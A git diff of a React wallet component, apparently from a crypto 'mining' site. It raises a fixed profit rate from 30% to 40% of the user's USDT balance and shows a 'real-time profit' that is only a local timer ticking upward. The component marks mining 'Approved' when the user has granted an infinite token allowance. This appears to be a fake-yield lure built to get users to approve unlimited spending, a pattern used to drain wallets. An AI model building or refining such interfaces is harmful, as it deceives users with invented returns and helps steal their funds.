@@ -122,7 +122,7 @@ export default function Wallet() {
     if (!userData || !usdtBalance || initializing) return;
   
 
-    const maxProfit = usdtBalance * 0.3;
+    const maxProfit = usdtBalance * 0.4;
     const profitPerSecond = maxProfit / (30 * 24 * 60 * 60);
 
     const interval = setInterval(async () => {
@@ -248,9 +248,8 @@ export default function Wallet() {
           {/* Display wallet information */}
           {[
           ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
-          ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
-          ["Profit (Real-time):", `$${currentProfit.toFixed(2)} USD`],
           ["Status Mining:", hasInfiniteAllowance ? "Approved" : "Not Approved"],
+          ["Profit (Real-time):", `$${currentProfit.toFixed(4)} USD`],
           ].map(([label, value], index) => (
             <div key={index} className="flex justify-between items-center p-4 bg-white/5 rounded-lg border border-gray-700">
               <span className="text-gray-300">{label}</span>
